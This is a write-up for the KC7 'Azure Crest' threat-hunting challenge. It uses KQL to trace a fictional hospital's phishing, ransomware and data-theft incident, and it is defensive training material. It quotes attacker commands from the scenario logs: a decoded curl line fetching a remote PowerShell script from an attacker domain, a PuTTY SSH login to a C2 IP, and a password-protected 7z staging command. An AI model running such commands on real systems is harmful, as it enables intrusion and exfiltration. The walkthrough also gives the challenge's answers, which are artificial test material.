# Azure Crest

A forensic investigation challenge involving a multi-stage phishing attack, ransomware deployment, and data exfiltration against a fictional healthcare organization using KQL queries in Azure Data Explorer.

![Difficulty](hxxps://img.shields[.]io/badge/Difficulty-Medium-yellow?style=flat-square) ![Platform](hxxps://img.shields[.]io/badge/Platform-KC7-blue?style=flat-square) ![Category](hxxps://img.shields[.]io/badge/Category-Threat%20Hunting-purple?style=flat-square)

---

## Challenge Overview

| Field | Value |
|-------|-------|
| **Challenge Name** | Azure Crest |
| **Author** | David Brown |
| **Platform** | KC7 (MetaCTF Cloud Lab) |
| **Category** | Threat Hunting, Incident Response |
| **Difficulty** | Medium |
| **Tools Used** | Azure Data Explorer (ADX), KQL, CyberChef, dCode.fr |
| **Target** | Azure Crest Hospital network environment |

**Scenario:** Azure Crest Hospital, a major healthcare provider, recently implemented a cost-cutting measure by developing a custom ERP system to centralize all patient records on a single database server. Following a suspicious file quarantine alert, analysts discovered a sophisticated phishing campaign targeting hospital employees. The investigation reveals macro-enabled document delivery, lateral movement via SSH, credential dumping, database enumeration, and ransomware deployment. Players use KQL queries in Azure Data Explorer to hunt through Email, FileCreationEvents, ProcessEvents, OutboundNetworkEvents, and InboundNetworkEvents logs to reconstruct the attack timeline and identify indicators of compromise.

---

## Attack Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2024-03-01T11:58:33Z | Initial phishing email delivered to Roy Trenneman (Database Administrator) |
| 2024-03-01T13:48:22Z | Threat actor reconnaissance begins on Azure Crest Hospital public website |
| 2024-03-04T10:52:18Z | Targeted phishing email sent to Roy Trenneman with malicious .docm link |
| 2024-03-04T11:28:18Z | Roy Trenneman clicks malicious link, downloads New_Healthcare_Protocols.docm |
| 2024-03-04T11:28:57Z | New_Healthcare_Protocols.docm created on SUPER-DB-SERVER-9000 |
| 2024-03-06T11:49:48Z | Additional phishing email with Pediatric_Care_Update.docm sent |
| 2024-03-14T10:27:39Z | Jerry Jones receives phishing email containing quarantined file link |
| 2024-03-14T10:37:39Z | Jerry Jones downloads New_Healthcare_Protocols.docm from takeyatimecarepartners[.]com |
| 2024-03-14T10:38:36Z | New_Healthcare_Protocols.docm created on ZQHM-LAPTOP (Jerry Jones) |
| 2024-03-14T10:39:26Z | Suspicious file quarantined on ZQHM-LAPTOP |
| 2024-04-01T14:06:04Z | heartburn[.]zip extracted to C:\ProgramData\Heartburn\ on P3EX-DESKTOP |
| 2024-04-01T15:13:25Z | dbhunter[.]exe created in C:\Windows\Temp\ on SUPER-DB-SERVER-9000 |
| 2024-04-02T10:50:22Z | anydesk_automation.ps1 downloaded via curl[.]exe |
| 2024-04-02T11:29:37Z | UrTottalyPwned[.]bat created on SUPER-DB-SERVER-9000 |
| 2024-04-02T11:32:20Z | Ransomware encryption begins, files receive .scholopendra extension |
| 2024-04-02T11:53:57Z | Desktop wallpaper changed to ItWentWrong.jpg via registry modification |

---

## Solution Walkthrough

### Step 1 — KQL Environment Setup & Employee Data Discovery

Navigate to Azure Data Explorer and familiarize with available tables: Employees, Email, OutboundNetworkEvents, InboundNetworkEvents, FileCreationEvents, ProcessEvents, SecurityAlerts, AuthenticationEvents, and PassiveDns.

```kql
// Initial employee reconnaissance - identify CFO
Employees
| where role == "Chief Financial Officer"
| project email_addr, name, ip_addr, hostname

// Result: Penny Pincher identified as CFO
```

**Key employee identified:** Penny Pincher (email: penny_pincher[@]azurecresthosfpital.med, IP: 10.0.0.1)

### Step 2 — Quarantine Alert Investigation

Investigate the initial security alert for a file with "healthcare" in the name.

```kql
// Find quarantined healthcare-related file
SecurityAlerts
| where description contains "healthcare"
| project timestamp, alert_type, severity, description

// Result: New_Healthcare_Protocols.docm quarantined on ZQHM-LAPTOP at 2024-03-14T10:39:26Z
```

**Quarantined file:** New_Healthcare_Protocols.docm  
**Affected host:** ZQHM-LAPTOP  
**SHA256:** 9195246412dc64c15e429887cac945bbde13c249d25dad01c7245219d1ac021a

### Step 3 — Victim Identification

Identify the employee whose computer contained the quarantined file.

```kql
// Map hostname to employee
Employees
| where hostname == "ZQHM-LAPTOP"
| project name, username, role, email_addr, ip_addr

// Result: Jerry Jones (Resident Doctor) on 10.10.0.174
```

**Victim employee:** Jerry Jones  
**Username:** jejones  
**Role:** Resident Doctors  
**Email:** jerry_jones[@]azurecresthosfpital.med

### Step 4 — Email Threat Vector Analysis

Trace the delivery mechanism for the malicious document.

```kql
// Find email containing link to quarantined file
Email
| where recipient == "jerry_jones@azurecresthosfpital.med"
| where link contains "New_Healthcare_Protocols.docm"
| project timestamp, sender, reply_to, subject, link, verdict

// Result: Email received at 2024-03-14T10:27:39Z from medstaffinfo@hospitalcomm.org
```

**Phishing email details:**  
**Sender:** medstaffinfo[@]hospitalcomm[.]org  
**Reply-to:** healthupdate[@]gmail[.]com  
**Subject:** [EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈  
**Malicious link:** hxxp://takeyatimecarepartners[.]com/images/images/files/New_Healthcare_Protocols.docm

### Step 5 — Domain Typosquatting Discovery

Identify the legitimate partner domain being spoofed.

```kql
// Search for similar partner domains in network events
InboundNetworkEvents
| where src_ip in ("131.92.62.82", "16.101.245.182", "93.142.203.80")
| where url contains "carepartners"
| distinct url

// Result: Legitimate domain is emergencycarepartners.com
```

**Typosquatted domain:** takeyatimecarepartners[.]com  
**Legitimate domain:** emergencycarepartners[.]com

### Step 6 — Phishing Campaign Scope Assessment

Determine the scale of the phishing campaign.

```kql
// Count distinct employee recipients of malicious emails
Email
| where sender == "healthupdate@gmail.com" or sender == "medstaffinfo@hospitalcomm.org"
    or link contains "Pediatric_Care_Update.docm"
    or link contains "New_Healthcare_Protocols.docm"
| distinct recipient
| count

// Result: 40 employees received phishing emails
```

**Campaign scope:** 40 employees targeted

```kql
// Count employees who clicked malicious links
OutboundNetworkEvents
| where url contains "New_Healthcare_Protocols.docm" or url contains "Pediatric_Care_Update.docm"
| distinct src_ip
| count

// Result: 37 employees clicked on links
```

**Click-through rate:** 37 out of 40 (92.5% success rate)

### Step 7 — Malware Payload Analysis

Identify secondary payload dropped by the macro-enabled document.

```kql
// Search for malicious executables in Temp folder on target database server
FileCreationEvents
| where hostname == "SUPER-DB-SERVER-9000"
| where path contains "temp"
| project timestamp, path, filename, sha256, process_name

// Result: dbhunter.exe created at 2024-04-01T15:13:25Z
```

**Malicious executable:** dbhunter[.]exe  
**SHA256:** c9a60b1ac56610e874ccff1a01c8e4d93a11576fc9dd82dbbafa9fd45c722ede  
**Path:** C:\Windows\Temp\dbhunter[.]exe  
**Purpose:** Database file enumeration tool (searches for .db, .sql, .mdb files)

### Step 8 — C2 Communication Discovery

Investigate SSH connections for command and control activity.

```kql
// Find SSH connections from compromised host
ProcessEvents
| where hostname == "P3EX-DESKTOP"
| where process_commandline contains "putty"
| project timestamp, process_commandline

// Result: SSH connection to 93.142.203.80 with credentials
```

**Command executed:**
```powershell
cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_tried -pw turning_it_off_and_on_again
```

**C2 credentials:**  
**Username:** have_ya_tried  
**Password:** turning_it_off_and_on_again

```kql
// Enumerate all unique SSH destination IPs
ProcessEvents
| where process_commandline contains "ssh"
| distinct process_commandline
| count

// Result: 17 unique SSH destination IPs
```

**SSH infrastructure:** 17 command and control servers

### Step 9 — Discovery Commands Enumeration

Identify post-exploitation reconnaissance activity.

```kql
// Hunt for discovery commands
ProcessEvents
| where hostname == "P3EX-DESKTOP"
| where process_commandline has_any ("sysinfo", "ipconfig", "tasklist",
    "whoami", "wmic", "net user", "net group", "net")
| project timestamp, process_commandline, process_name

// Result: 5 discovery commands executed
```

**Discovery commands executed:**
- `whoami`
- `net user /domain`
- `net group "domain computers" /domain`
- `net group "domain admins" /domain`
- `net localgroup administrators`

### Step 10 — Data Exfiltration Preparation

Identify data staging and compression activities.

```kql
// Find 7-Zip compression with password protection
ProcessEvents
| where hostname == "SUPER-DB-SERVER-9000"
| where process_commandline contains "meme"
| project timestamp, process_commandline

// Result: Database files compressed with password protection
```

**Exfiltration command:**
```bash
7z.exe a -t7z C:\Out\Roys_Meme_Collection.7z C:\Out\*meme*.mdb -p mommawemadeit
```

**Archive password:** mommawemadeit

### Step 11 — Ransomware Deployment Investigation

Analyze ransomware execution and file encryption.

```kql
// Identify ransomware batch script and encrypted files
FileCreationEvents
| where hostname == "SUPER-DB-SERVER-9000"
| where timestamp >= datetime(2024-04-02T11:29:37Z)
| project timestamp, path, filename

// Result: UrTottalyPwned.bat executed, files encrypted with .scholopendra extension
```

**Ransomware script:** UrTottalyPwned[.]bat  
**Encryption extension:** .scholopendra  
**Files encrypted:** Multiple user directories (Desktop, Downloads, Pictures, Videos, Music)

```kql
// Find desktop wallpaper change via registry modification
ProcessEvents
| where hostname == "SUPER-DB-SERVER-9000"
| where process_commandline has_any ("reg", "regedit", "registry")
| project timestamp, process_commandline

// Result: Desktop wallpaper changed to ransom note
```

**Registry modification:**
```cmd
cmd.exe /c reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f
```

**Ransom note image:** ItWentWrong.jpg

### Step 12 — Compromise Scope Assessment

Determine the total number of affected systems.

```kql
// Count distinct hosts with heartburn malware artifacts
FileCreationEvents
| where path contains "heartburn"
| distinct hostname
| count

// Result: 35 employee computers compromised
```

**Total compromised systems:** 35 hosts

### Step 13 — Threat Intelligence & Attribution

Identify targeted employee and reconnaissance activities.

```kql
// Find reconnaissance activities against hospital website
InboundNetworkEvents
| where src_ip in ("131.92.62.82", "16.101.245.182", "93.142.203.80")
| project timestamp, src_ip, url
| order by timestamp asc

// Result: Threat actor researched IT department changes
```

**Reconnaissance target:** Roy Trenneman (Database Administrator, hired June 15, 2023)  
**Intelligence gathered:** Half of IT department fired, custom ERP system vulnerabilities

```kql
// Identify targeted phishing email to Roy
Email
| where recipient == "roy_trenneman@azurecresthosfpital.med"
| where subject contains "external"
| project timestamp, sender, subject, link

// Result: Roy targeted on 2024-03-04T10:52:18Z
```

**Primary target:** Roy Trenneman on SUPER-DB-SERVER-9000

### Step 14 — Obfuscated Artifact Decoding

Use CyberChef and dCode.fr to decode obfuscated URLs and commands found in investigation.

**Base64 + Reverse decoding example:**
```
Input: YWVkaS1kb29nLWEtc2ktc215c3RzLXByZS1ud28tcnVveS1nbm5pbnVyLXlody9oY3JhZXNlci9zd2VuL2RlbS5sYXRpcHNvaHRzZXJjZXJ1emEvLzpzcHR0aA==
Operations: From Base64 → Reverse
Output: https://azurecresthosfpital.med/news/research/why-running-your-own-erp-systems-is-a-good-idea
```

**Base64 + Gzip decoding example:**
```
Input: H4sIAHySBGYA/23MscoCMRAE4FfJCxixtdXC0j4uP2tuMT9essfuBMzbnxxX2gzMDHy52xzlI+Gq4XJ0KT2I6G76Mq5XBu/LTdjw7Nb2zm1M4u8/7tDK+NcWFz+FAiz+VY5EW/RWhGeUYZLVJh80qR4huWz/b2YFYGJUDpQAAAA=
Operations: From Base64 → Gunzip
Output: curl.exe -o C:\ProgramData\Heartburn\anydesk_automation.ps1 https://unhealthyrecordsystems.tech/anydesk_automation.ps1
```

---

## IOC Table

| Type | Indicator | Context | Threat Actor |
|------|-----------|---------|--------------|
| Domain | takeyatimecarepartners[.]com | Typosquatted domain hosting malicious .docm files | Unknown |
| Domain | unhealthyrecordsystems[.]tech | Malware distribution infrastructure | Unknown |
| Domain | medequipamateurs[.]org | Malware distribution infrastructure | Unknown |
| Domain | pharmasecondbest[.]net | Malware distribution infrastructure | Unknown |
| Email | healthupdate[@]gmail[.]com | Phishing email sender / reply-to address | Unknown |
| Email | medstaffinfo[@]hospitalcomm[.]org | Phishing email sender address | Unknown |
| IP | 93[.]142[.]203[.]80 | SSH C2 server | Unknown |
| IP | 131[.]92[.]62[.]82 | SSH C2 server | Unknown |
| IP | 16[.]101[.]245[.]182 | SSH C2 server | Unknown |
| IP | 131[.]190[.]102[.]173 | SSH C2 server | Unknown |
| IP | 7[.]125[.]34[.]183 | SSH C2 server | Unknown |
| IP | 10[.]10[.]0[.]174 | Jerry Jones compromised workstation (ZQHM-LAPTOP) | N/A |
| IP | 10[.]10[.]0[.]2 | Roy Trenneman database server (SUPER-DB-SERVER-9000) | N/A |
| File Hash (SHA256) | 9195246412dc64c15e429887cac945bbde13c249d25dad01c7245219d1ac021a | New_Healthcare_Protocols.docm (macro-enabled malicious document) | Unknown |
| File Hash (SHA256) | c9a60b1ac56610e874ccff1a01c8e4d93a11576fc9dd82dbbafa9fd45c722ede | dbhunter[.]exe (database enumeration tool) | Unknown |
| File Hash (SHA256) | 13c00a5045d23f39674906ab8f890052f3c948259be0cf7f6ec90faebe6f97c | secretsdump[.]exe (credential dumping tool) | Unknown |
| File Hash (SHA256) | f0d81fc32b23602e5f1648b262ba89715e0287194fd1620e1788b578e898e056 | New_Healthcare_Protocols.docm (Roy Trenneman variant) | Unknown |
| Filename | New_Healthcare_Protocols.docm | Malicious macro-enabled Word document | Unknown |
| Filename | Pediatric_Care_Update.docm | Malicious macro-enabled Word document | Unknown |
| Filename | heartburn[.]zip | Archive containing attacker tools | Unknown |
| Filename | dbhunter[.]exe | Database file reconnaissance tool | Unknown |
| Filename | secretsdump[.]exe | Impacket credential dumping utility | Unknown |
| Filename | UrTottalyPwned[.]bat | Ransomware encryption batch script | Unknown |
| Extension | .scholopendra | Ransomware file extension | Unknown |
| Username | have_ya_tried | SSH authentication credential | Unknown |
| Password | turning_it_off_and_on_again | SSH authentication credential | Unknown |
| Password | mommawemadeit | 7-Zip archive encryption password | Unknown |

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence from Investigation |
|--------|--------------|----------------|----------------------------|
| Reconnaissance | T1593.002 | Search Open Websites/Domains | Threat actor browsed Azure Crest Hospital website researching IT department changes, security policies, and employee information |
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | 40 employees received emails with malicious .docm files from healthupdate[@]gmail[.]com and medstaffinfo[@]hospitalcomm[.]org |
| Execution | T1204.002 | User Execution: Malicious File | 37 employees clicked links and downloaded New_Healthcare_Protocols.docm or Pediatric_Care_Update.docm |
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Registry modification to change desktop wallpaper via HKCU\Control Panel\Desktop |
| Defense Evasion | T1027 | Obfuscated Files or Information | Base64+Gzip encoding of curl command, Base64+ROT13+Reverse encoding of URLs |
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name or Location | Tools placed in C:\ProgramData\Heartburn\, process masquerading as explorer[.]exe |
| Credential Access | T1003 | OS Credential Dumping | secretsdump[.]exe deployed to extract credentials from SAM/LSA |
| Discovery | T1087.002 | Account Discovery: Domain Account | Commands: net user /domain, net group "domain admins" /domain, net group "domain computers" /domain |
| Discovery | T1082 | System Information Discovery | Commands: whoami, sysinfo, ipconfig, tasklist |
| Discovery | T1083 | File and Directory Discovery | dbhunter[.]exe searches for .db, .sql, .mdb database files |
| Lateral Movement | T1021.004 | Remote Services: SSH | PuTTY used to establish SSH connections to 17 distinct C2 IP addresses |
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | 7z[.]exe used to compress database files: 7z[.]exe a -t7z C:\Out\Roys_Meme_Collection.7z |
| Command and Control | T1219 | Remote Access Software | AnyDesk automation script (anydesk_automation.ps1) downloaded via curl[.]exe |
| Exfiltration | T1020 | Automated Exfiltration | Database files compressed with password protection for exfiltration preparation |
| Impact | T1486 | Data Encrypted for Impact | UrTottalyPwned[.]bat encrypted files with .scholopendra extension |
| Impact | T1491.001 | Defacement: Internal Defacement | Desktop wallpaper changed to ItWentWrong.jpg ransom note via registry modification |

---

## Tools Used

- **Azure Data Explorer (ADX)** — Primary investigation platform for querying security telemetry using Kusto Query Language (KQL)
- **CyberChef** — Multi-layer decoding of obfuscated strings (Base64, Gzip, ROT13, Reverse operations)
- **dCode.fr** — Atbash cipher decoding for URL deobfuscation
- **Apache Guacamole** — Remote access to investigation environment via MetaCTF Cloud Lab
- **KQL** — Kusto Query Language for threat hunting across Email, FileCreationEvents, ProcessEvents, OutboundNetworkEvents, InboundNetworkEvents, SecurityAlerts, and Employees tables

---

## Key Takeaways

1. **Phishing Effectiveness** — The threat actor achieved a 92.5% click-through rate (37 of 40 targets) by leveraging healthcare-themed social engineering targeting medical staff with urgent pediatric care content, demonstrating the effectiveness of contextually relevant lures in high-stress environments.

2. **Cost-Cutting Security Risks** — Azure Crest's decision to develop a custom ERP system with centralized database architecture created a single point of failure that amplified the impact of the compromise, illustrating the security risks of prioritizing cost reduction over defense-in-depth architecture.

3. **Typosquatting Infrastructure** — The attacker registered domains closely resembling legitimate partner organizations (takeyatimecarepartners[.]com vs. emergencycarepartners[.]com) to bypass user scrutiny, emphasizing the need for DMARC/SPF enforcement and user awareness of domain inspection techniques.

4. **Credential Reuse Across Infrastructure** — The SSH credentials (have_ya_tried / turning_it_off_and_on_again) were reused across 17 C2 servers, demonstrating poor operational security that defenders can exploit for infrastructure mapping and blocking.

5. **KQL Threat Hunting Workflow** — Successful investigation required correlation across multiple log sources (Email → OutboundNetworkEvents → FileCreationEvents → ProcessEvents), demonstrating the importance of centralized logging and cross-referencing capabilities for incident response.

6. **Living off the Land Techniques** — The attacker leveraged native Windows utilities (curl[.]exe, cmd[.]exe, reg[.]exe, 7z[.]exe, explorer[.]exe) and legitimate tools (PuTTY, AnyDesk) to evade detection, highlighting the need for behavioral analytics and command-line auditing beyond signature-based detection.

---

## References

- [MITRE ATT&CK T1566.001 - Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [MITRE ATT&CK T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
- [MITRE ATT&CK T1486 - Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
- [MITRE ATT&CK T1021.004 - Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/)
- [MITRE ATT&CK T1219 - Remote Access Software](https://attack.mitre.org/techniques/T1219/)
- [Microsoft KQL Documentation](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)
- [Impacket SecretsDump.py Documentation](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [CyberChef Operations Reference](hxxps://gchq.github[.]io/CyberChef/)
- [KC7 Platform - The Free Cyber Detective Game](hxxps://kc7cyber[.]com/)
- [Lockheed Martin Cyber Kill Chain](hxxps://www.lockheedmartin[.]com/en-us/capabilities/cyber/cyber-kill-chain.html)

---

*Author: David Brown | Platform: KC7 (MetaCTF) | Date: 2024*